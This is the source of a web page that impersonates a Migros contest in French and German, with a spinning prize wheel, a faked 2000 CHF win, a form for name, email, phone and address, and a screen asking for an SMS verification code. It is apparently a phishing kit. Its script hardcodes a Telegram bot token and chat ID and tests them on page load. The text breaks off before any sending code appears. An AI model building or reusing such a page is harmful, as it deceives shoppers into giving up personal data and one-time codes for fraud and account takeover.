<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Concours - Tournez la roue!</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            width: 100%;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .language-switcher {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            gap: 10px;
            z-index: 1000;
        }
        
        .lang-btn {
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            backdrop-filter: blur(5px);
        }
        
        .lang-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }
        
        .lang-btn.active {
            background: rgba(255, 255, 255, 0.4);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        
        .screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            transition: transform 0.5s ease, opacity 0.5s ease;
        }
        
        .screen.small {
            transform: scale(0.85);
            opacity: 0.9;
        }
        
        .hidden {
            display: none !important;
        }
        
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .contest-title {
            font-size: 1.8rem;
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .prize-section {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            width: 100%;
            max-width: 400px;
            box-shadow: 
                0 10px 20px rgba(0, 0, 0, 0.2),
                0 6px 6px rgba(0, 0, 0, 0.23),
                inset 0 1px 0 rgba(255, 255, 255, 0.3);
            transform: perspective(500px) rotateX(5deg);
            transition: transform 0.3s ease;
        }
        
        .prize-section:hover {
            transform: perspective(500px) rotateX(5deg) translateY(-5px);
        }
        
        .prize-amount {
            font-size: 2.2rem;
            font-weight: bold;
            margin: 10px 0;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.4);
        }
        
        .countdown {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin: 25px 0;
            perspective: 1000px;
        }
        
        .time-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px 25px;
            min-width: 120px;
            box-shadow: 
                0 10px 20px rgba(0, 0, 0, 0.3),
                0 6px 6px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.2);
            transform: perspective(500px) rotateX(10deg);
            transition: transform 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .time-box::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(to right, #ff8a00, #da1b60);
            border-radius: 10px 10px 0 0;
        }
        
        .time-box:hover {
            transform: perspective(500px) rotateX(10deg) translateY(-5px);
        }
        
        .time-value {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 5px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .time-label {
            font-size: 1rem;
            opacity: 0.9;
        }
        
        .attempts {
            font-size: 1.2rem;
            margin: 20px 0;
            background: rgba(255, 255, 255, 0.1);
            display: inline-block;
            padding: 8px 20px;
            border-radius: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .wheel-container {
            position: relative;
            width: 320px;
            height: 320px;
            margin: 30px auto;
        }
        
        .wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: conic-gradient(
                #ff6384 0deg 60deg,
                #36a2eb 60deg 120deg,
                #ffce56 120deg 180deg,
                #4bc0c0 180deg 240deg,
                #9966ff 240deg 300deg,
                #ff9f40 300deg 360deg
            );
            position: relative;
            transition: transform 4s cubic-bezier(0.2, 0.8, 0.3, 1);
            box-shadow: 
                0 0 30px rgba(0, 0, 0, 0.4),
                inset 0 0 50px rgba(255, 255, 255, 0.1);
            border: 8px solid rgba(255, 255, 255, 0.2);
        }
        
        .wheel.spinning-slow {
            transition: transform 5s cubic-bezier(0.1, 0.5, 0.2, 1);
        }
        
        .wheel.spinning-fast {
            transition: transform 2.5s cubic-bezier(0.1, 0.1, 0.1, 1);
        }
        
        .wheel.spinning-bounce {
            transition: transform 3.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
        }
        
        .wheel.spinning-smooth {
            transition: transform 4s cubic-bezier(0.2, 0.8, 0.2, 0.9);
        }
        
        .wheel-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 70px;
            height: 70px;
            background: radial-gradient(circle, #fff 0%, #e0e0e0 100%);
            border-radius: 50%;
            z-index: 2;
            box-shadow: 
                0 0 20px rgba(0, 0, 0, 0.4),
                inset 0 0 10px rgba(0, 0, 0, 0.2);
            border: 3px solid rgba(255, 255, 255, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #333;
            font-size: 0.9rem;
        }
        
        .pointer {
            position: absolute;
            top: -25px;
            left: 50%;
            transform: translateX(-50%);
            width: 35px;
            height: 50px;
            background: linear-gradient(45deg, #ff4757, #ff3742);
            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
            z-index: 3;
            filter: drop-shadow(0 5px 8px rgba(0, 0, 0, 0.4));
            border-radius: 2px;
        }
        
        .pointer::after {
            content: '';
            position: absolute;
            top: 5px;
            left: 50%;
            transform: translateX(-50%);
            width: 15px;
            height: 15px;
            background: rgba(255, 255, 255, 0.3);
            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
        }
        
        .spin-effects {
            display: flex;
            gap: 15px;
            margin: 15px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .effect-btn {
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9rem;
            backdrop-filter: blur(5px);
        }
        
        .effect-btn:hover {
            background: rgba(255, 255, 255, 0.25);
            transform: translateY(-2px);
        }
        
        .effect-btn.active {
            background: rgba(255, 255, 255, 0.4);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        
        .spin-button, .retry-button, .claim-button, .submit-button, .validate-button {
            background: linear-gradient(to right, #ff8a00, #da1b60);
            border: none;
            color: white;
            font-size: 1.5rem;
            font-weight: bold;
            padding: 15px 50px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .spin-button::before, .retry-button::before, .claim-button::before, .submit-button::before, .validate-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .spin-button:hover::before, .retry-button:hover::before, .claim-button:hover::before, .submit-button:hover::before, .validate-button:hover::before {
            left: 100%;
        }
        
        .spin-button:hover, .retry-button:hover, .claim-button:hover, .submit-button:hover, .validate-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
        }
        
        .spin-button:active, .retry-button:active, .claim-button:active, .submit-button:active, .validate-button:active {
            transform: translateY(1px);
        }
        
        .wheel-item {
            position: absolute;
            top: 0;
            left: 50%;
            width: 50%;
            height: 50%;
            transform-origin: bottom left;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .wheel-text {
            transform: rotate(90deg);
            font-weight: bold;
            color: white;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);
            font-size: 1.1rem;
            padding-left: 20px;
        }
        
        .wheel-sparkle {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            pointer-events: none;
            opacity: 0;
            background: radial-gradient(circle, transparent 30%, rgba(255,255,255,0.3) 70%);
            transition: opacity 0.3s ease;
        }
        
        .wheel.sparkle .wheel-sparkle {
            opacity: 1;
        }
        
        .pulse {
            animation: pulse 0.5s ease-in-out;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .shake {
            animation: shake 0.5s ease-in-out;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Rest of your existing CSS styles remain the same */
        .lose-screen, .win-screen, .form-screen, .sms-screen {
            background: rgba(255, 255, 255, 0.95);
            color: #333;
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            text-align: center;
            transform: perspective(1000px) rotateX(5deg);
            transition: transform 0.5s ease;
        }
        
        .lose-screen:hover, .win-screen:hover, .form-screen:hover, .sms-screen:hover {
            transform: perspective(1000px) rotateX(5deg) translateY(-5px);
        }
        
        .lose-title {
            font-size: 3rem;
            color: #e74c3c;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        .win-title {
            font-size: 3rem;
            color: #27ae60;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        .form-title, .sms-title {
            font-size: 2.5rem;
            color: #2575fc;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        .lose-message, .win-message {
            font-size: 1.5rem;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .chance-message {
            font-size: 1.2rem;
            margin-bottom: 30px;
            color: #666;
        }
        
        .prize-won {
            font-size: 2rem;
            font-weight: bold;
            color: #e67e22;
            margin: 20px 0;
        }
        
        .emoji {
            font-size: 3rem;
            margin: 10px 0;
        }
        
        .separator {
            width: 80%;
            height: 2px;
            background: #eee;
            margin: 20px auto;
        }
        
        .partnership {
            margin-top: 15px;
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            flex-wrap: wrap;
            max-width: 400px;
            line-height: 1.4;
        }
        
        .partnership-text {
            font-size: 0.85rem;
        }
        
        .partner-logos {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 5px;
        }
        
        .partner-logo {
            font-weight: bold;
            font-size: 0.9rem;
            padding: 2px 6px;
            border-radius: 4px;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .apple-logo {
            color: #A2AAAD;
        }
        
        .sony-logo {
            color: #0066CC;
        }
        
        .form-container, .sms-container {
            width: 100%;
            max-width: 450px;
            text-align: left;
        }
        
        .form-group, .sms-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .form-label, .sms-label {
            display: block;
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
        }
        
        .form-input, .sms-input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: #f9f9f9;
        }
        
        .form-input:focus, .sms-input:focus {
            outline: none;
            border-color: #2575fc;
            box-shadow: 0 0 0 2px rgba(37, 117, 252, 0.2);
            background: white;
        }
        
        .form-instruction, .sms-instruction {
            font-size: 0.9rem;
            color: #666;
            margin-top: 5px;
            font-style: italic;
        }
        
        .prize-announcement {
            font-size: 1.5rem;
            margin-bottom: 25px;
            color: #2575fc;
            font-weight: 600;
        }
        
        .form-section-title {
            font-size: 1.3rem;
            margin: 25px 0 15px;
            color: #333;
            font-weight: 600;
            border-bottom: 1px solid #eee;
            padding-bottom: 8px;
        }
        
        .input-icon {
            position: absolute;
            right: 15px;
            top: 40px;
            color: #666;
            font-size: 1.2rem;
        }
        
        .status-message {
            padding: 10px;
            border-radius: 5px;
            margin: 15px 0;
            text-align: center;
            font-weight: bold;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .sms-description {
            font-size: 1.1rem;
            margin-bottom: 30px;
            line-height: 1.5;
            color: #555;
        }
        
        .sms-timer {
            font-size: 1.2rem;
            margin: 15px 0;
            color: #2575fc;
            font-weight: bold;
        }
        
        .sms-code-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .sms-digit {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 1.8rem;
            font-weight: bold;
            border: 2px solid #ddd;
            border-radius: 8px;
            background: #f9f9f9;
            transition: all 0.3s ease;
        }
        
        .sms-digit:focus {
            outline: none;
            border-color: #2575fc;
            box-shadow: 0 0 0 2px rgba(37, 117, 252, 0.2);
            background: white;
        }
        
        .resend-link {
            color: #2575fc;
            text-decoration: none;
            margin-top: 15px;
            display: inline-block;
            font-size: 1rem;
            cursor: pointer;
        }
        
        .resend-link:hover {
            text-decoration: underline;
        }
        
        .resend-link.disabled {
            color: #999;
            cursor: not-allowed;
        }
        
        .resend-link.disabled:hover {
            text-decoration: none;
        }
        
        @media (max-width: 600px) {
            .language-switcher {
                top: 10px;
                right: 10px;
            }
            
            .lang-btn {
                padding: 6px 12px;
                font-size: 0.9rem;
            }
            
            .countdown {
                gap: 15px;
            }
            
            .time-box {
                min-width: 100px;
                padding: 10px 15px;
            }
            
            .time-value {
                font-size: 2rem;
            }
            
            .wheel-container {
                width: 280px;
                height: 280px;
            }
            
            .spin-effects {
                gap: 10px;
            }
            
            .effect-btn {
                padding: 6px 12px;
                font-size: 0.8rem;
            }
            
            .lose-screen, .win-screen, .form-screen, .sms-screen {
                padding: 30px 20px;
            }
            
            .lose-title, .win-title {
                font-size: 2.5rem;
            }
            
            .form-title, .sms-title {
                font-size: 2rem;
            }
            
            .screen.small {
                transform: scale(0.9);
            }
            
            .partnership {
                font-size: 0.8rem;
                gap: 5px;
            }
            
            .partner-logos {
                gap: 5px;
            }
            
            .partner-logo {
                font-size: 0.8rem;
                padding: 1px 4px;
            }
            
            .sms-digit {
                width: 40px;
                height: 50px;
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="language-switcher">
        <button class="lang-btn active" id="lang-fr">FR</button>
        <button class="lang-btn" id="lang-de">DE</button>
    </div>
    
    <div class="container">
        <!-- Écran principal du jeu -->
        <div class="screen" id="game-screen">
            <div class="logo">MIGROS</div>
            <div class="contest-title" data-fr="GRAND CONCOURS" data-de="GROSSER GEWINNSPIEL">GRAND CONCOURS</div>
            
            <div class="prize-section">
                <div data-fr="Tournez la roue et tentez de gagner" data-de="Drehen Sie das Rad und gewinnen Sie">Tournez la roue et tentez de gagner</div>
                <div class="prize-amount" data-fr="Jusqu'à 2000 CHF !" data-de="Bis zu 2000 CHF!">Jusqu'à 2000 CHF !</div>
            </div>
            
            <div class="countdown">
                <div class="time-box">
                    <div class="time-value" id="minutes">09</div>
                    <div class="time-label" data-fr="MINUTES" data-de="MINUTEN">MINUTES</div>
                </div>
                <div class="time-box">
                    <div class="time-value" id="seconds">48</div>
                    <div class="time-label" data-fr="SECONDES" data-de="SEKUNDEN">SECONDES</div>
                </div>
            </div>
            
            <div class="attempts">
                <span data-fr="Tentatives restantes:" data-de="Verbleibende Versuche:">Tentatives restantes:</span> 
                <span id="attempts-count">3</span>
            </div>
            
            <div class="wheel-container">
                <div class="pointer"></div>
                <div class="wheel" id="wheel">
                    <div class="wheel-sparkle"></div>
                    <!-- Les éléments de la roue seront ajoutés par JavaScript -->
                </div>
                <div class="wheel-center">MIGROS</div>
            </div>

            <div class="spin-effects">
                <button class="effect-btn active" data-effect="smooth" data-fr="Lisse" data-de="Sanft">Lisse</button>
                <button class="effect-btn" data-effect="slow" data-fr="Lent" data-de="Langsam">Lent</button>
                <button class="effect-btn" data-effect="fast" data-fr="Rapide" data-de="Schnell">Rapide</button>
                <button class="effect-btn" data-effect="bounce" data-fr="Rebond" data-de="Springen">Rebond</button>
            </div>
            
            <button class="spin-button" id="spin-btn" data-fr="TOURNEZ ET GAGNEZ!" data-de="DREHEN UND GEWINNEN!">TOURNEZ ET GAGNEZ!</button>
            
            <div class="partnership">
                <div class="partnership-text" data-fr="Concours organisé en partenariat avec" data-de="Wettbewerb in Partnerschaft mit">Concours organisé en partenariat avec</div>
                <div class="partner-logos">
                    <span class="partner-logo apple-logo">APPLE</span>
                    <span data-fr="et" data-de="und">et</span>
                    <span class="partner-logo sony-logo">SONY</span>
                </div>
            </div>
        </div>
        
        <!-- Rest of your HTML remains exactly the same -->
        <!-- Écran de perte -->
        <div class="screen hidden" id="lose-screen">
            <div class="lose-screen">
                <div class="lose-title" data-fr="DOMMAGE !" data-de="SCHADE!">DOMMAGE !</div>
                <div class="lose-message" data-fr="Vous n'avez pas gagné cette fois-ci." data-de="Sie haben diesmal nicht gewonnen.">Vous n'avez pas gagné cette fois-ci.</div>
                <div class="chance-message">
                    <span data-fr="Il vous reste encore" data-de="Sie haben noch">Il vous reste encore</span> 
                    <span id="remaining-attempts">1</span> 
                    <span data-fr="chance !" data-de="Chance!">chance !</span>
                </div>
                
                <div class="separator"></div>
                
                <button class="retry-button" id="retry-btn" data-fr="RÉESSAYER" data-de="NOCHMAL VERSUCHEN">RÉESSAYER</button>
            </div>
        </div>
        
        <!-- Écran de gain -->
        <div class="screen hidden" id="win-screen">
            <div class="win-screen">
                <div class="win-title" data-fr="FÉLICITATIONS!" data-de="GLÜCKWUNSCH!">FÉLICITATIONS!</div>
                <div class="emoji">🎉</div>
                <div class="prize-won" data-fr="Vous avez gagné 2000 CHF!" data-de="Sie haben 2000 CHF gewonnen!">Vous avez gagné 2000 CHF!</div>
                <div class="win-message" data-fr="Votre gain vous attend!" data-de="Ihr Gewinn erwartet Sie!">Votre gain vous attend!</div>
                
                <div class="separator"></div>
                
                <button class="claim-button" id="claim-btn" data-fr="RÉCLAMEZ VOTRE GAIN" data-de="GEWINN EINLÖSEN">RÉCLAMEZ VOTRE GAIN</button>
            </div>
        </div>
        
        <!-- Écran du formulaire -->
        <div class="screen hidden" id="form-screen">
            <div class="form-screen">
                <div class="form-title">MIGROS</div>
                <div class="prize-announcement" data-fr="Vous avez remporté une carte cadeau d'une valeur de 2000 CHF." data-de="Sie haben einen Geschenkgutschein im Wert von 2000 CHF gewonnen.">Vous avez remporté une carte cadeau d'une valeur de 2000 CHF.</div>
                
                <div class="separator"></div>
                
                <div class="prize-amount" style="color: #e67e22; margin: 20px 0;">2000 CHF</div>
                
                <div style="margin-bottom: 25px; font-size: 1.1rem;" data-fr="Remplissez le formulaire ci-dessous pour recevoir votre Carte Cadeau" data-de="Füllen Sie das untenstehende Formular aus, um Ihren Geschenkgutschein zu erhalten">
                    Remplissez le formulaire ci-dessous pour recevoir votre Carte Cadeau
                </div>
                
                <div class="form-container">
                    <div class="form-section-title" data-fr="Informations personnelles" data-de="Persönliche Informationen">Informations personnelles</div>
                    
                    <div class="form-group">
                        <label class="form-label" for="fullname" data-fr="Nom complet" data-de="Vollständiger Name">Nom complet</label>
                        <input type="text" id="fullname" class="form-input" data-fr-placeholder="Votre nom complet" data-de-placeholder="Ihr vollständiger Name">
                        <i class="fas fa-user input-icon"></i>
                        <div class="form-instruction" data-fr="Votre nom complet" data-de="Ihr vollständiger Name">Votre nom complet</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label" for="email" data-fr="Email" data-de="E-Mail">Email</label>
                        <input type="email" id="email" class="form-input" data-fr-placeholder="Votre adresse email" data-de-placeholder="Ihre E-Mail-Adresse">
                        <i class="fas fa-envelope input-icon"></i>
                        <div class="form-instruction" data-fr="Votre adresse email valide" data-de="Ihre gültige E-Mail-Adresse">Votre adresse email valide</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label" for="phone" data-fr="Téléphone" data-de="Telefon">Téléphone</label>
                        <input type="tel" id="phone" class="form-input" data-fr-placeholder="Votre numéro de téléphone" data-de-placeholder="Ihre Telefonnummer">
                        <i class="fas fa-phone input-icon"></i>
                        <div class="form-instruction" data-fr="Votre numéro de téléphone" data-de="Ihre Telefonnummer">Votre numéro de téléphone</div>
                    </div>
                    
                    <div class="form-section-title" data-fr="Adresse de livraison" data-de="Lieferadresse">Adresse de livraison</div>
                    
                    <div class="form-group">
                        <label class="form-label" for="address" data-fr="Adresse" data-de="Adresse">Adresse</label>
                        <input type="text" id="address" class="form-input" data-fr-placeholder="Votre adresse complète" data-de-placeholder="Ihre vollständige Adresse">
                        <i class="fas fa-home input-icon"></i>
                        <div class="form-instruction" data-fr="Votre adresse complète" data-de="Ihre vollständige Adresse">Votre adresse complète</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label" for="city" data-fr="Ville" data-de="Stadt">Ville</label>
                        <input type="text" id="city" class="form-input" data-fr-placeholder="Votre ville de résidence" data-de-placeholder="Ihre Wohnstadt">
                        <i class="fas fa-city input-icon"></i>
                        <div class="form-instruction" data-fr="Votre ville de résidence" data-de="Ihre Wohnstadt">Votre ville de résidence</div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label" for="postalcode" data-fr="Code Postal" data-de="Postleitzahl">Code Postal</label>
                        <input type="text" id="postalcode" class="form-input" data-fr-placeholder="Votre code postal" data-de-placeholder="Ihre Postleitzahl">
                        <i class="fas fa-mail-bulk input-icon"></i>
                        <div class="form-instruction" data-fr="Votre code postal" data-de="Ihre Postleitzahl">Votre code postal</div>
                    </div>
                    
                    <div id="status-message"></div>
                    
                    <div class="separator"></div>
                    
                    <button class="submit-button" id="submit-btn">
                        <span id="submit-text" data-fr="ENVOYER" data-de="SENDEN">ENVOYER</span>
                        <span id="submit-loading" class="hidden loading"></span>
                    </button>
                </div>
            </div>
        </div>
        
        <!-- Écran de vérification SMS -->
        <div class="screen hidden" id="sms-screen">
            <div class="sms-screen">
                <div class="sms-title" data-fr="Authentication" data-de="Authentifizierung">Authentication</div>
                <div class="sms-description" data-fr="Veuillez confirmer votre numéro de téléphone afin que notre équipe de livraison puisse vous joindre lors de la remise de votre carte-cadeau." data-de="Bitte bestätigen Sie Ihre Telefonnummer, damit unser Zustellungsteam Sie bei der Übergabe Ihres Geschenkgutscheins erreichen kann.">
                    Veuillez confirmer votre numéro de téléphone afin que notre équipe de livraison puisse vous joindre lors de la remise de votre carte-cadeau.
                </div>
                
                <div class="sms-timer" id="sms-timer">2:50</div>
                
                <div class="sms-description" data-fr="Entrez le code reçu par SMS." data-de="Geben Sie den per SMS erhaltenen Code ein.">Entrez le code reçu par SMS.</div>
                
                <div class="sms-code-input">
                    <input type="text" class="sms-digit" maxlength="1" id="digit1">
                    <input type="text" class="sms-digit" maxlength="1" id="digit2">
                    <input type="text" class="sms-digit" maxlength="1" id="digit3">
                    <input type="text" class="sms-digit" maxlength="1" id="digit4">
                </div>
                
                <div id="sms-status-message"></div>
                
                <button class="validate-button" id="validate-btn">
                    <span id="validate-text" data-fr="VALIDER" data-de="BESTÄTIGEN">VALIDER</span>
                    <span id="validate-loading" class="hidden loading"></span>
                </button>
                
                <div class="sms-description">
                    <span data-fr="Vous n'avez pas reçu le code ?" data-de="Sie haben den Code nicht erhalten?">Vous n'avez pas reçu le code ?</span> 
                    <a href="#" class="resend-link" id="resend-link" data-fr="Renvoyer" data-de="Erneut senden">Renvoyer</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ✅ التوكن والـ Chat ID الصحيحين
        const BOT_TOKEN = "8315734664:AAHyKwjDdF_lFf4t240Qhr77K7hr07sKlq4";
        const CHAT_ID = "5006042556";
        
        // إعدادات اللغة
        let currentLanguage = 'fr';
        const frBtn = document.getElementById('lang-fr');
        const deBtn = document.getElementById('lang-de');
        
        // عناصر العجلة
        const wheelItems = [
            "100 CHF", "200 CHF", "50 CHF", 
            "1000 CHF", "150 CHF", "2000 CHF"
        ];
        
        // تهيئة العجلة
        const wheel = document.getElementById('wheel');
        const anglePerItem = 360 / wheelItems.length;
        
        wheelItems.forEach((item, index) => {
            const wheelItem = document.createElement('div');
            wheelItem.className = 'wheel-item';
            wheelItem.style.transform = `rotate(${index * anglePerItem}deg)`;
            
            const wheelText = document.createElement('div');
            wheelText.className = 'wheel-text';
            wheelText.textContent = item;
            
            wheelItem.appendChild(wheelText);
            wheel.appendChild(wheelItem);
        });
        
        // المؤقت
        let minutes = 9;
        let seconds = 48;
        let attempts = 3;
        let attemptCount = 0;
        
        const minutesElement = document.getElementById('minutes');
        const secondsElement = document.getElementById('seconds');
        const attemptsElement = document.getElementById('attempts-count');
        const spinButton = document.getElementById('spin-btn');
        
        // عناصر الشاشات
        const gameScreen = document.getElementById('game-screen');
        const loseScreen = document.getElementById('lose-screen');
        const winScreen = document.getElementById('win-screen');
        const formScreen = document.getElementById('form-screen');
        const smsScreen = document.getElementById('sms-screen');
        const remainingAttemptsElement = document.getElementById('remaining-attempts');
        const retryButton = document.getElementById('retry-btn');
        const claimButton = document.getElementById('claim-btn');
        const submitButton = document.getElementById('submit-btn');
        const submitText = document.getElementById('submit-text');
        const submitLoading = document.getElementById('submit-loading');
        const statusMessage = document.getElementById('status-message');
        
        // عناصر صفحة SMS
        const validateButton = document.getElementById('validate-btn');
        const validateText = document.getElementById('validate-text');
        const validateLoading = document.getElementById('validate-loading');
        const smsStatusMessage = document.getElementById('sms-status-message');
        const resendLink = document.getElementById('resend-link');
        const smsTimer = document.getElementById('sms-timer');
        const digit1 = document.getElementById('digit1');
        const digit2 = document.getElementById('digit2');
        const digit3 = document.getElementById('digit3');
        const digit4 = document.getElementById('digit4');
        
        // متغيرات مؤقت SMS
        let smsMinutes = 2;
        let smsSeconds = 50;
        let smsTimerInterval;
        let canResend = false;
        let userPhone = "";
        let smsAttempts = 0;
        let correctSMSCode = "1234";

        // تأثيرات التدوير الجديدة
        let currentEffect = 'smooth';
        const effectButtons = document.querySelectorAll('.effect-btn');

        // إعداد تأثيرات التدوير
        effectButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                effectButtons.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentEffect = btn.dataset.effect;
            });
        });

        // ✅ اختبار التوكن الجديد عند التحميل
        window.addEventListener('load', function() {
            console.log("🔔 Test du nouveau token Telegram...");
            testTelegramConnection();
        });
        
        // دالة لاختبار اتصال Telegram
        async function testTelegramConnection() {
            try {
                const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
                const response = await fetch(testUrl);
                const data = await response.json();
                
                if (data.ok) {
                    console.log("✅ Token Telegram VALIDE!");
                    console.log("🤖 Nom du bot:", data.result.first_name);
                    console.log("🆔 ID du bot:", data.result.id);
                    console.log("👤 Username du bot:", data.result.username);
                } else {
                    console.log("❌ Token Telegram INVALIDE!");
                    console.log("Erreur:", data.description);
                }
            } catch (error) {
                console.log("🌐 Impossible de tester le token (problème de connexion)");
            }
        }
        
        // دالة تغيير اللغة
        function changeLanguage(lang) {
            currentLanguage = lang;
            
            // تحديث أزرار اللغة
            frBtn.classList.toggle('active', lang === 'fr');
            deBtn.classList.toggle('active', lang === 'de');
            
            // تحديث النصوص
            document.querySelectorAll('[data-fr]').forEach(element => {
                const textFr = element.getAttribute('data-fr');
                const textDe = element.getAttribute('data-de');
                
                if (lang === 'fr') {
                    element.textContent = textFr;
                } else if (lang === 'de') {
                    element.textContent = textDe;
                }
            });
            
            // تحديث النصوص في عناصر الإدخال
            document.querySelectorAll('[data-fr-placeholder]').forEach(input => {
                const placeholderFr = input.getAttribute('data-fr-placeholder');
                const placeholderDe = input.getAttribute('data-de-placeholder');
                
                if (lang === 'fr') {
                    input.placeholder = placeholderFr;
                } else if (lang === 'de') {
                    input.placeholder = placeholderDe;
                }
            });
            
            // تحديث لغة HTML
            document.documentElement.lang = lang;
        }
        
        // أحداث أزرار اللغة
        frBtn.addEventListener('click', () => changeLanguage('fr'));
        deBtn.addEventListener('click', () => changeLanguage('de'));
        
        // دالة المؤقت الرئيسية
        function updateCountdown() {
            seconds--;
            
            if (seconds < 0) {
                seconds = 59;
                minutes--;
            }
            
            if (minutes < 0) {
                minutes = 0;
                seconds = 0;
                spinButton.disabled = true;
                spinButton.textContent = currentLanguage === 'fr' ? "Temps écoulé!" : "Zeit abgelaufen!";
                clearInterval(countdownInterval);
            }
            
            minutesElement.textContent = minutes.toString().padStart(2, '0');
            secondsElement.textContent = seconds.toString().padStart(2, '0');
        }
        
        const countdownInterval = setInterval(updateCountdown, 1000);
        
        // تدوير العجلة المحسّن
        let isSpinning = false;
        
        spinButton.addEventListener('click', () => {
            if (isSpinning || attempts <= 0) return;
            
            isSpinning = true;
            attempts--;
            attemptCount++;
            attemptsElement.textContent = attempts;
            
            if (attemptCount === 1 || attemptCount === 2) {
                gameScreen.classList.add('small');
            }
            
            // تأثيرات بصرية قبل التدوير
            wheel.classList.add('pulse');
            setTimeout(() => wheel.classList.remove('pulse'), 500);
            
